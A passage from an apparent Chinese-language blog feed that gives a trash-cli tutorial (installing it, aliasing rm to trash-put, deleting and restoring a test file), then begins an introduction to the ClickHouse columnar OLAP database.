href="#trash-cli&#x662F;&#x4E00;&#x4E2A;&#x4F7F;&#x7528;-python-&#x5F00;&#x53D1;&#x7684;&#x8F6F;&#x4EF6;&#x5305;&#xFF0C;trash-cli-trashes&#x8BB0;&#x5F55;&#x539F;&#x59CB;&#x8DEF;&#x5F84;&#xFF0C;&#x5220;&#x9664;&#x65E5;&#x671F;&#x548C;&#x6743;&#x9650;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x5B83;&#x4F7F;&#x7528;KDE&#xFF0C;GNOME&#x548C;XFCE&#x4F7F;&#x7528;&#x7684;&#x76F8;&#x540C;&#x5783;&#x573E;&#x6876;&#xFF0C;&#x4F46;&#x60A8;&#x53EF;&#x4EE5;&#x4ECE;&#x547D;&#x4EE4;&#x884C;&#xFF08;&#x548C;&#x811A;&#x672C;&#xFF09;&#x8C03;&#x7528;&#x5B83;&#x3002;&#x5305;&#x542B;" class="headerlink" title="trash-cli&#x662F;&#x4E00;&#x4E2A;&#x4F7F;&#x7528; python &#x5F00;&#x53D1;&#x7684;&#x8F6F;&#x4EF6;&#x5305;&#xFF0C;trash-cli trashes&#x8BB0;&#x5F55;&#x539F;&#x59CB;&#x8DEF;&#x5F84;&#xFF0C;&#x5220;&#x9664;&#x65E5;&#x671F;&#x548C;&#x6743;&#x9650;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x5B83;&#x4F7F;&#x7528;KDE&#xFF0C;GNOME&#x548C;XFCE&#x4F7F;&#x7528;&#x7684;&#x76F8;&#x540C;&#x5783;&#x573E;&#x6876;&#xFF0C;&#x4F46;&#x60A8;&#x53EF;&#x4EE5;&#x4ECE;&#x547D;&#x4EE4;&#x884C;&#xFF08;&#x548C;&#x811A;&#x672C;&#xFF09;&#x8C03;&#x7528;&#x5B83;&#x3002;&#x5305;&#x542B;:"></a><a href="https://github.com/andreafrancia/trash-cli" target="_blank" rel="noopener">trash-cli</a>&#x662F;&#x4E00;&#x4E2A;&#x4F7F;&#x7528; python &#x5F00;&#x53D1;&#x7684;&#x8F6F;&#x4EF6;&#x5305;&#xFF0C;trash-cli trashes&#x8BB0;&#x5F55;&#x539F;&#x59CB;&#x8DEF;&#x5F84;&#xFF0C;&#x5220;&#x9664;&#x65E5;&#x671F;&#x548C;&#x6743;&#x9650;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x5B83;&#x4F7F;&#x7528;KDE&#xFF0C;GNOME&#x548C;XFCE&#x4F7F;&#x7528;&#x7684;&#x76F8;&#x540C;&#x5783;&#x573E;&#x6876;&#xFF0C;&#x4F46;&#x60A8;&#x53EF;&#x4EE5;&#x4ECE;&#x547D;&#x4EE4;&#x884C;&#xFF08;&#x548C;&#x811A;&#x672C;&#xFF09;&#x8C03;&#x7528;&#x5B83;&#x3002;&#x5305;&#x542B;:</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* trash-put           trash files and directories.</span><br><span class="line">* trash-empty         empty the trashcan(s).</span><br><span class="line">* trash-list          list trashed files.</span><br><span class="line">* trash-restore       restore a trashed file.</span><br><span class="line">* trash-rm            remove individual files from the trashcan.</span><br></pre></td></tr></tbody></table></figure><h2 id="trash-cli-&#x5B89;&#x88C5;"><a href="#trash-cli-&#x5B89;&#x88C5;" class="headerlink" title="trash-cli &#x5B89;&#x88C5;"></a>trash-cli &#x5B89;&#x88C5;</h2><h4 id="The-easy-way"><a href="#The-easy-way" class="headerlink" title="The easy way"></a>The easy way</h4><h5 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements:"></a>Requirements:</h5><blockquote><p>Python 2.7 or Python 3<br>  setuptools (use apt-get install python-setuptools on Debian)</p></blockquote><p>Installation command:<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">easy_install trash-cli</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="From-sources"><a href="#From-sources" class="headerlink" title="From sources"></a>From sources</h4><h5 id="System-wide-installation"><a href="#System-wide-installation" class="headerlink" title="System-wide installation:"></a>System-wide installation:</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/andreafrancia/trash-cli.git</span><br><span class="line"><span class="built_in">cd</span> trash-cli</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></tbody></table></figure><h5 id="User-only-installation"><a href="#User-only-installation" class="headerlink" title="User-only installation:"></a>User-only installation:</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/andreafrancia/trash-cli.git</span><br><span class="line"><span class="built_in">cd</span> trash-cli</span><br><span class="line">python setup.py install --user</span><br></pre></td></tr></tbody></table></figure><h2 id="trash-cli-&#x547D;&#x4EE4;"><a href="#trash-cli-&#x547D;&#x4EE4;" class="headerlink" title="trash-cli &#x547D;&#x4EE4;"></a>trash-cli &#x547D;&#x4EE4;</h2><h4 id="&#x67E5;&#x770B;&#x5B89;&#x88C5;&#x6210;&#x529F;&#x4E4B;&#x540E;&#x7684;&#x547D;&#x4EE4;"><a href="#&#x67E5;&#x770B;&#x5B89;&#x88C5;&#x6210;&#x529F;&#x4E4B;&#x540E;&#x7684;&#x547D;&#x4EE4;" class="headerlink" title="&#x67E5;&#x770B;&#x5B89;&#x88C5;&#x6210;&#x529F;&#x4E4B;&#x540E;&#x7684;&#x547D;&#x4EE4;"></a>&#x67E5;&#x770B;&#x5B89;&#x88C5;&#x6210;&#x529F;&#x4E4B;&#x540E;&#x7684;&#x547D;&#x4EE4;</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ll /usr/bin/ | grep trash</span></span><br><span class="line">-rwxr-xr-x    1 root root         123 Feb  2 17:43 trash</span><br><span class="line">-rwxr-xr-x    1 root root         125 Feb  2 17:43 trash-empty</span><br><span class="line">-rwxr-xr-x    1 root root         124 Feb  2 17:43 trash-list</span><br><span class="line">-rwxr-xr-x    1 root root         123 Feb  2 17:43 trash-put</span><br><span class="line">-rwxr-xr-x    1 root root         127 Feb  2 17:43 trash-restore</span><br><span class="line">-rwxr-xr-x    1 root root         122 Feb  2 17:43 trash-rm</span><br></pre></td></tr></tbody></table></figure><h6 id="&#x529F;&#x80FD;&#x8BF4;&#x660E;&#xFF1A;"><a href="#&#x529F;&#x80FD;&#x8BF4;&#x660E;&#xFF1A;" class="headerlink" title="&#x529F;&#x80FD;&#x8BF4;&#x660E;&#xFF1A;"></a>&#x529F;&#x80FD;&#x8BF4;&#x660E;&#xFF1A;</h6><ul><li>trash-put     &#x5C06;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x79FB;&#x5165;&#x56DE;&#x6536;&#x7AD9;</li><li>trash-empty   &#x6E05;&#x7A7A;&#x56DE;&#x6536;&#x7AD9;</li><li>trash-list    &#x5217;&#x51FA;&#x56DE;&#x6536;&#x7AD9;&#x4E2D;&#x7684;&#x6587;&#x4EF6;</li><li>trash-restore &#x8FD8;&#x539F;&#x56DE;&#x6536;&#x7AD9;&#x4E2D;&#x7684;&#x6587;&#x4EF6;</li><li>trash-rm      &#x5220;&#x9664;&#x56DE;&#x9996;&#x7AD9;&#x4E2D;&#x7684;&#x5355;&#x4E2A;&#x6587;&#x4EF6;</li></ul><h6 id="&#x7528;&#x5B83;&#x66FF;&#x4EE3;-rm&#x547D;&#x4EE4;"><a href="#&#x7528;&#x5B83;&#x66FF;&#x4EE3;-rm&#x547D;&#x4EE4;" class="headerlink" title="&#x7528;&#x5B83;&#x66FF;&#x4EE3; rm&#x547D;&#x4EE4;"></a>&#x7528;&#x5B83;&#x66FF;&#x4EE3; rm&#x547D;&#x4EE4;</h6><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vim .bashrc </span></span><br><span class="line"><span class="comment"># .bashrc</span></span><br><span class="line"><span class="comment">#alias rm=&apos;rm -i&apos;</span></span><br><span class="line"><span class="built_in">alias</span> rm=<span class="string">&apos;trash-put&apos;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="&#x5B9E;&#x9A8C;&#x6D4B;&#x8BD5;"><a href="#&#x5B9E;&#x9A8C;&#x6D4B;&#x8BD5;" class="headerlink" title="&#x5B9E;&#x9A8C;&#x6D4B;&#x8BD5;"></a>&#x5B9E;&#x9A8C;&#x6D4B;&#x8BD5;</h2><h4 id="&#x5220;&#x9664;&#x6D4B;&#x8BD5;&#xFF1A;"><a href="#&#x5220;&#x9664;&#x6D4B;&#x8BD5;&#xFF1A;" class="headerlink" title="&#x5220;&#x9664;&#x6D4B;&#x8BD5;&#xFF1A;"></a>&#x5220;&#x9664;&#x6D4B;&#x8BD5;&#xFF1A;</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rm -rf dump.sql</span></span><br><span class="line"><span class="comment"># ll ~/.local/share/Trash/files </span></span><br><span class="line">-rw-r--r-- 1 root root 123 Jul 17  2018 dump.sql</span><br><span class="line"> </span><br><span class="line"><span class="comment"># trash-list</span></span><br><span class="line">2019-02-02 18:02:33 /root/dump.sql</span><br></pre></td></tr></tbody></table></figure><h4 id="&#x8FD8;&#x539F;&#x5220;&#x9664;&#x7684;&#x6587;&#x4EF6;"><a href="#&#x8FD8;&#x539F;&#x5220;&#x9664;&#x7684;&#x6587;&#x4EF6;" class="headerlink" title="&#x8FD8;&#x539F;&#x5220;&#x9664;&#x7684;&#x6587;&#x4EF6;"></a>&#x8FD8;&#x539F;&#x5220;&#x9664;&#x7684;&#x6587;&#x4EF6;</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># trash-restore /root/dump.rdb</span></span><br><span class="line">   0 2019-02-02 18:01:08 /root/dump.sql.bak</span><br><span class="line">   1 2019-02-02 18:02:33 /root/dump.sql</span><br><span class="line">What file to restore [0..1]: 1</span><br><span class="line"></span><br><span class="line">&#x8FD8;&#x539F;&#x6210;&#x529F;</span><br><span class="line"><span class="comment"># ll /root/dump.rdb </span></span><br><span class="line">-rw-r--r-- 1 root root 123 Jul 17  2018 /root/dump.sql</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x7ED3;&#x675F;"><a href="#&#x7ED3;&#x675F;" class="headerlink" title="&#x7ED3;&#x675F;"></a>&#x7ED3;&#x675F;</h2><h4 id="trash-put&#x547D;&#x4EE4;&#x4F1A;&#x628A;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x5220;&#x9664;&#x7684;&#x6587;&#x4EF6;&#x79FB;&#x52A8;&#x5230;-local-share-Trash-files-&#x4E2D;&#x3002;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x8BB0;&#x5F55;&#x5728;-local-share-Trash-info&#x4E2D;&#x3002;"><a href="#trash-put&#x547D;&#x4EE4;&#x4F1A;&#x628A;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x5220;&#x9664;&#x7684;&#x6587;&#x4EF6;&#x79FB;&#x52A8;&#x5230;-local-share-Trash-files-&#x4E2D;&#x3002;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x8BB0;&#x5F55;&#x5728;-local-share-Trash-info&#x4E2D;&#x3002;" class="headerlink" title="trash-put&#x547D;&#x4EE4;&#x4F1A;&#x628A;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x5220;&#x9664;&#x7684;&#x6587;&#x4EF6;&#x79FB;&#x52A8;&#x5230;~/.local/share/Trash/files &#x4E2D;&#x3002;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x8BB0;&#x5F55;&#x5728;~/.local/share/Trash/info&#x4E2D;&#x3002;"></a>trash-put&#x547D;&#x4EE4;&#x4F1A;&#x628A;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x5220;&#x9664;&#x7684;&#x6587;&#x4EF6;&#x79FB;&#x52A8;&#x5230;~/.local/share/Trash/files &#x4E2D;&#x3002;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x8BB0;&#x5F55;&#x5728;~/.local/share/Trash/info&#x4E2D;&#x3002;</h4><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;a href=&quot;#&amp;#x524D;&amp;#x8A00;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;/a&gt;&amp;#x524D;&amp;#x8A00;&lt;/h2&gt;&lt;h4 id=&quot;&amp;#x641E;&amp;
      
    
    </summary>
    
      <category term="Linux" scheme="https://jiemin.wang/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://jiemin.wang/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>ClickHouse-sync-to-MySQLDate</title>
    <link href="https://jiemin.wang/2019/03/20/ClickHouse-sync-to-MySQLDate/"/>
    <id>https://jiemin.wang/2019/03/20/ClickHouse-sync-to-MySQLDate/</id>
    <published>2019-03-20T02:27:04.000Z</published>
    <updated>2019-03-20T03:45:10.206Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><ul><li>ClickHouse &#x8FD9;&#x6B3E;&#x4EA7;&#x54C1;&#x5927;&#x5BB6;&#x90FD;&#x542C;&#x8BF4;&#x8FC7;&#x5F88;&#x5FEB;&#xFF0C;&#x4F46;&#x662F;&#x5230;&#x5E95;&#x6709;&#x591A;&#x6050;&#x6016;&#xFF1F;</li><li>ClickHouse &#x5230;&#x5E95;&#x662F;&#x4EC0;&#x4E48;&#xFF1F;</li></ul><h2 id="&#x4ECB;&#x7ECD;"><a href="#&#x4ECB;&#x7ECD;" class="headerlink" title="&#x4ECB;&#x7ECD;"></a>&#x4ECB;&#x7ECD;</h2><p>ClickHouse&#x6700;&#x521D;&#x662F;&#x4E3A; Yandex.Metrica &#x4E16;&#x754C;&#x7B2C;&#x4E8C;&#x5927;Web&#x5206;&#x6790;&#x5E73;&#x53F0; &#x800C;&#x5F00;&#x53D1;&#x7684;&#x3002;&#x591A;&#x5E74;&#x6765;&#x4E00;&#x76F4;&#x4F5C;&#x4E3A;&#x8BE5;&#x7CFB;&#x7EDF;&#x7684;&#x6838;&#x5FC3;&#x7EC4;&#x4EF6;&#x88AB;&#x8BE5;&#x7CFB;&#x7EDF;&#x6301;&#x7EED;&#x4F7F;&#x7528;&#x7740;&#x3002;&#x76EE;&#x524D;&#x4E3A;&#x6B62;&#xFF0C;&#x8BE5;&#x7CFB;&#x7EDF;&#x5728;ClickHouse&#x4E2D;&#x6709;&#x8D85;&#x8FC7;13&#x4E07;&#x4EBF;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x5E76;&#x4E14;&#x6BCF;&#x5929;&#x8D85;&#x8FC7;200&#x591A;&#x4EBF;&#x4E2A;&#x4E8B;&#x4EF6;&#x88AB;&#x5904;&#x7406;&#x3002;&#x5B83;&#x5141;&#x8BB8;&#x76F4;&#x63A5;&#x4ECE;&#x539F;&#x59CB;&#x6570;&#x636E;&#x4E2D;&#x52A8;&#x6001;&#x67E5;&#x8BE2;&#x5E76;&#x751F;&#x6210;&#x62A5;&#x544A;&#x3002;&#x672C;&#x6587;&#x7B80;&#x8981;&#x4ECB;&#x7ECD;&#x4E86;ClickHouse&#x5728;&#x5176;&#x65E9;&#x671F;&#x53D1;&#x5C55;&#x9636;&#x6BB5;&#x7684;&#x76EE;&#x6807;&#x3002;</p><p>Yandex.Metrica&#x57FA;&#x4E8E;&#x7528;&#x6237;&#x5B9A;&#x4E49;&#x7684;&#x5B57;&#x6BB5;&#xFF0C;&#x5BF9;&#x5B9E;&#x65F6;&#x8BBF;&#x95EE;&#x3001;&#x8FDE;&#x63A5;&#x4F1A;&#x8BDD;&#xFF0C;&#x751F;&#x6210;&#x5B9E;&#x65F6;&#x7684;&#x7EDF;&#x8BA1;&#x62A5;&#x8868;&#x3002;&#x8FD9;&#x79CD;&#x9700;&#x6C42;&#x5F80;&#x5F80;&#x9700;&#x8981;&#x590D;&#x6742;&#x805A;&#x5408;&#x65B9;&#x5F0F;&#xFF0C;&#x6BD4;&#x5982;&#x5BF9;&#x8BBF;&#x95EE;&#x7528;&#x6237;&#x8FDB;&#x884C;&#x53BB;&#x91CD;&#x3002;&#x6784;&#x5EFA;&#x62A5;&#x8868;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x662F;&#x5B9E;&#x65F6;&#x63A5;&#x6536;&#x5B58;&#x50A8;&#x7684;&#x65B0;&#x6570;&#x636E;&#x3002;</p><p>&#x622A;&#x81F3;2014&#x5E74;4&#x6708;&#xFF0C;Yandex.Metrica&#x6BCF;&#x5929;&#x8DDF;&#x8E2A;&#x5927;&#x7EA6;120&#x4EBF;&#x4E2A;&#x4E8B;&#x4EF6;&#xFF08;&#x7528;&#x6237;&#x7684;&#x70B9;&#x51FB;&#x548C;&#x6D4F;&#x89C8;&#xFF09;&#x3002;&#x4E3A;&#x4E86;&#x53EF;&#x4EE5;&#x521B;&#x5EFA;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x62A5;&#x8868;&#xFF0C;&#x6211;&#x4EEC;&#x5FC5;&#x987B;&#x5B58;&#x50A8;&#x5168;&#x90E8;&#x8FD9;&#x4E9B;&#x4E8B;&#x4EF6;&#x3002;&#x540C;&#x65F6;&#xFF0C;&#x8FD9;&#x4E9B;&#x67E5;&#x8BE2;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x5728;&#x51E0;&#x767E;&#x6BEB;&#x79D2;&#x5185;&#x626B;&#x63CF;&#x6570;&#x767E;&#x4E07;&#x884C;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x6216;&#x5728;&#x51E0;&#x79D2;&#x5185;&#x626B;&#x63CF;&#x6570;&#x4EBF;&#x884C;&#x7684;&#x6570;&#x636E;&#x3002;</p><h4 id="&#x4EC0;&#x4E48;&#x662F;ClickHouse"><a href="#&#x4EC0;&#x4E48;&#x662F;ClickHouse" class="headerlink" title="&#x4EC0;&#x4E48;&#x662F;ClickHouse ?"></a><strong>&#x4EC0;&#x4E48;&#x662F;ClickHouse ?</strong></h4><p>ClickHouse &#x662F;&#x9762;&#x5411; OLAP &#x7684;&#x5206;&#x5E03;&#x5F0F;&#x5217;&#x5F0F; DBMS.</p><h4 id="ClickHouse&#x7684;&#x663E;&#x8457;&#x7279;&#x6027;"><a href="#ClickHouse&#x7684;&#x663E;&#x8457;&#x7279;&#x6027;" class="headerlink" title="ClickHouse&#x7684;&#x663E;&#x8457;&#x7279;&#x6027;"></a>ClickHouse&#x7684;&#x663E;&#x8457;&#x7279;&#x6027;</h4><ul><li>&#x771F;&#x6B63;&#x7684;&#x9762;&#x5411;&#x5217;&#x7684;DBMS</li><li>&#x6570;&#x636E;&#x9AD8;&#x6548;&#x538B;&#x7F29;</li><li>&#x78C1;&#x76D8;&#x5B58;&#x50A8;&#x7684;&#x6570;&#x636E;</li><li>&#x591A;&#x6838;&#x5E76;&#x884C;&#x5904;&#x7406;</li></ul><ul><li>&#x5728;&#x591A;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5206;&#x5E03;&#x5F0F;&#x5904;&#x7406;<ul><li>SQL&#x8BED;&#x6CD5;&#x652F;&#x6301;</li></ul></li></ul><ul><li>&#x5411;&#x91CF;&#x5316;&#x5F15;&#x64CE;</li><li>&#x5B9E;&#x65F6;&#x6570;&#x636E;&#x66F4;&#x65B0;</li><li>&#x7D22;&#x5F15;</li><li>&#x9002;&#x5408;&#x5728;&#x7EBF;&#x67E5;&#x8BE2;</li><li>&#x652F;&#x6301;&#x8FD1;&#x4F3C;&#x9884;&#x4F30;&#x8BA1;&#x7B97;</li><li>&#x652F;&#x6301;&#x5D4C;&#x5957;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;</li><li>&#x652F;&#x6301;&#x6570;&#x7EC4;&#x4F5C;&#x4E3A;&#x6570;&#x636E;&#x7C7B;&#x578B;</li><li>&#x652F;&#x6301;&#x9650;&#x5236;&#x67E5;&#x8BE2;&#x590D;&#x6742;&#x6027;&#x4EE5;&#x53CA;&#x914D;&#x989D;</li><li>&#x590D;&#x5236;&#x6570;&#x636E;&#x590D;&#x5236;&#x548C;&#x5BF9;&#x6570;&#x636E;&#x5B8C;&#x6574;&#x6027;&#x7684;&#x652F;&#x6301;</li></ul><h4 id="OLAP&#x573A;&#x666F;&#x7684;&#x5173;&#x952E;&#x7279;&#x5F81;"><a href="#OLAP&#x573A;&#x666F;&#x7684;&#x5173;&#x952E;&#x7279;&#x5F81;" class="headerlink" title="OLAP&#x573A;&#x666F;&#x7684;&#x5173;&#x952E;&#x7279;&#x5F81;"></a>OLAP&#x573A;&#x666F;&#x7684;&#x5173;&#x952E;&#x7279;&#x5F81;</h4><ul><li>&#x5927;&#x591A;&#x6570;&#x662F;&#x8BFB;&#x8BF7;&#x6C42;</li><li>&#x6570;&#x636E;&#x603B;&#x662F;&#x4EE5;&#x76F8;&#x5F53;&#x5927;&#x7684;&#x6279;(&gt; 1000 rows)&#x8FDB;&#x884C;&#x5199;&#x5165;</li><li>&#x4E0D;&#x4FEE;&#x6539;&#x5DF2;&#x6DFB;&#x52A0;&#x7684;&#x6570;&#x636E;</li><li>&#x6BCF;&#x6B21;&#x67E5;&#x8BE2;&#x90FD;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x8BFB;&#x53D6;&#x5927;&#x91CF;&#x7684;&#x884C;&#xFF0C;&#x4F46;&#x662F;&#x540C;&#x65F6;&#x53C8;&#x4EC5;&#x9700;&#x8981;&#x5C11;&#x91CF;&#x7684;&#x5217;</li><li>&#x5BBD;&#x8868;&#xFF0C;&#x5373;&#x6BCF;&#x4E2A;&#x8868;&#x5305;&#x542B;&#x7740;&#x5927;&#x91CF;&#x7684;&#x5217;</li><li>&#x8F83;&#x5C11;&#x7684;&#x67E5;&#x8BE2;(&#x901A;&#x5E38;&#x6BCF;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x6BCF;&#x79D2;&#x6570;&#x767E;&#x4E2A;&#x67E5;&#x8BE2;&#x6216;&#x66F4;&#x5C11;)</li><li>&#x5BF9;&#x4E8E;&#x7B80;&#x5355;&#x67E5;&#x8BE2;&#xFF0C;&#x5141;&#x8BB8;&#x5EF6;&#x8FDF;&#x5927;&#x7EA6;50&#x6BEB;&#x79D2;</li><li>&#x5217;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x76F8;&#x5BF9;&#x8F83;&#x5C0F;&#xFF1A; &#x6570;&#x5B57;&#x548C;&#x77ED;&#x5B57;&#x7B26;&#x4E32;(&#x4F8B;&#x5982;&#xFF0C;&#x6BCF;&#x4E2A;URL 60&#x4E2A;&#x5B57;&#x8282;)</li><li>&#x5904;&#x7406;&#x5355;&#x4E2A;&#x67E5;&#x8BE2;&#x65F6;&#x9700;&#x8981;&#x9AD8;&#x541E;&#x5410;&#x91CF;&#xFF08;&#x6BCF;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x6BCF;&#x79D2;&#x9AD8;&#x8FBE;&#x6570;&#x5341;&#x4EBF;&#x884C;&#xFF09;</li><li>&#x4E8B;&#x52A1;&#x4E0D;&#x662F;&#x5FC5;&#x987B;&#x7684;</li><li>&#x5BF9;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#x8981;&#x6C42;&#x4F4E;</li><li>&#x6BCF;&#x4E00;&#x4E2A;&#x67E5;&#x8BE2;&#x9664;&#x4E86;&#x4E00;&#x4E2A;&#x5927;&#x8868;&#x5916;&#x90FD;&#x5F88;&#x5C0F;</li><li>&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x660E;&#x663E;&#x5C0F;&#x4E8E;&#x6E90;&#x6570;&#x636E;&#xFF0C;&#x6362;&#x53E5;&#x8BDD;&#x8BF4;&#xFF0C;&#x6570;&#x636E;&#x88AB;&#x8FC7;&#x6EE4;&#x6216;&#x805A;&#x5408;&#x540E;&#x80FD;&#x591F;&#x88AB;&#x76DB;&#x653E;&#x5728;&#x5355;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x7684;&#x5185;&#x5B58;&#x4E2D;</li></ul><h4 id="&#x5217;&#x5F0F;&#x6570;&#x636E;&#x5E93;&#x66F4;&#x9002;&#x5408;OLAP&#x573A;&#x666F;&#x7684;&#x539F;&#x56E0;"><a href="#&#x5217;&#x5F0F;&#x6570;&#x636E;&#x5E93;&#x66F4;&#x9002;&#x5408;OLAP&#x573A;&#x666F;&#x7684;&#x539F;&#x56E0;" class="headerlink" title="&#x5217;&#x5F0F;&#x6570;&#x636E;&#x5E93;&#x66F4;&#x9002;&#x5408;OLAP&#x573A;&#x666F;&#x7684;&#x539F;&#x56E0;"></a>&#x5217;&#x5F0F;&#x6570;&#x636E;&#x5E93;&#x66F4;&#x9002;&#x5408;OLAP&#x573A;&#x666F;&#x7684;&#x539F;&#x56E0;</h4><p>&#x5217;&#x5F0F;&#x6570;&#x636E;&#x5E93;&#x66F4;&#x9002;&#x5408;&#x4E8E;OLAP&#x573A;&#x666F;(&#x5BF9;&#x4E8E;&#x5927;&#x591A;&#x6570;&#x67E5;&#x8BE2;&#x800C;&#x8A00;&#xFF0C;&#x5904;&#x7406;&#x901F;&#x5EA6;&#x81F3;&#x5C11;&#x63D0;&#x9AD8;&#x4E86;100&#x500D;)&#xFF0C;&#x4E0B;&#x9762;&#x8BE6;&#x7EC6;&#x89E3;&#x91CA;&#x4E86;&#x539F;&#x56E0;(&#x901A;&#x8FC7;&#x56FE;&#x7247;&#x66F4;&#x6709;&#x5229;&#x4E8E;&#x76F4;&#x89C2;&#x7406;&#x89E3;)&#xFF1A;<br>&#x884C;&#x5F0F;<br><img src="/2019/03/20/ClickHouse-sync-to-MySQLDate/row_oriented.gif" title="row_oriented"><br>&#x5217;&#x5F0F;<br><img src="/2019/03/20/ClickHouse-sync-to-MySQLDate/column_oriented.gif" title="column_oriented"><br>&#x770B;&#x5230;&#x5DEE;&#x522B;&#x4E86;&#x4E48;&#xFF1F;&#x4E0B;&#x9762;&#x5C06;&#x8BE6;&#x7EC6;&#x4ECB;&#x7ECD;&#x4E3A;&#x4EC0;&#x4E48;&#x4F1A;&#x53D1;&#x751F;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x3002;<br>1.&#x9488;&#x5BF9;&#x5206;&#x6790;&#x7C7B;&#x67E5;&#x8BE2;&#xFF0C;&#x901A;&#x5E38;&#x53EA;&#x9700;&#x8981;&#x8BFB;&#x53D6;&#x8868;&#x7684;&#x4E00;&#x5C0F;&#x90E8;&#x5206;&#x5217;&#x3002;&#x5728;&#x5217;&#x5F0F;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x4F60;&#x53EF;&#x4EE5;&#x53EA;&#x8BFB;&#x53D6;&#x4F60;&#x9700;&#x8981;&#x7684;&#x6570;&#x636E;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x5982;&#x679C;&#x53EA;&#x9700;&#x8981;&#x8BFB;&#x53D6;100&#x5217;&#x4E2D;&#x7684;5&#x5217;&#xFF0C;&#x8FD9;&#x5C06;&#x5E2E;&#x52A9;&#x4F60;&#x6700;&#x5C11;&#x51CF;&#x5C11;20&#x500D;&#x7684;I/O&#x6D88;&#x8017;&#x3002;<br>2.&#x7531;&#x4E8E;&#x6570;&#x636E;&#x603B;&#x662F;&#x6253;&#x5305;&#x6210;&#x6279;&#x91CF;&#x8BFB;&#x53D6;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x538B;&#x7F29;&#x662F;&#x975E;&#x5E38;&#x5BB9;&#x6613;&#x7684;&#x3002;&#x540C;&#x65F6;&#x6570;&#x636E;&#x6309;&#x5217;&#x5206;&#x522B;&#x5B58;&#x50A8;&#x8FD9;&#x4E5F;&#x66F4;&#x5BB9;&#x6613;&#x538B;&#x7F29;&#x3002;&#x8FD9;&#x8FDB;&#x4E00;&#x6B65;&#x964D;&#x4F4E;&#x4E86;I/O&#x7684;&#x4F53;&#x79EF;&#x3002;<br>3.&#x7531;&#x4E8E;I/O&#x7684;&#x964D;&#x4F4E;&#xFF0C;&#x8FD9;&#x5C06;&#x5E2E;&#x52A9;&#x66F4;&#x591A;&#x7684;&#x6570;&#x636E;&#x88AB;&#x7CFB;&#x7EDF